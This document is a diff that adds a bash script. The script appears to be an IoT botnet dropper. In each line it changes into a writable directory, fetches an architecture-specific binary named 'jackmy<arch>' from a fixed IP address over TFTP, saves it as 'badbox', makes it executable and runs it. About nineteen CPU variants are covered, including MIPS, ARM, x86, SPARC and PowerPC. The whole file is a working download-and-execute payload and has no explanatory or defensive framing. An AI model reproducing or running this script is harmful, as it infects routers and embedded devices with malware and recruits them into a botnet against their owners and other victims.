@@ -1,0 +1,21 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmymips;cat jackmymips >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmymips64;cat jackmymips64 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmymipsel;cat jackmymipsel >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmysh2eb;cat jackmysh2eb >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmysh2elf;cat jackmysh2elf >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmysh4;cat jackmysh4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyx86;cat jackmyx86 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyi486;cat jackmyi486 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyi586;cat jackmyi586 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyi686;cat jackmyi686 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmypowerpc;cat jackmypowerpc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmypowerpc440fp;cat jackmypowerpc440fp >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmym86k;cat jackmym86k >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmysparc;cat jackmysparc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyarmv4;cat jackmyarmv4 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyarmv4tl;cat jackmyarmv4tl >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyarmv5;cat jackmyarmv5 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; tftp 195.62.52.3 -c get jackmyarmv6;cat jackmyarmv6 >badbox;chmod +x *;./badbox
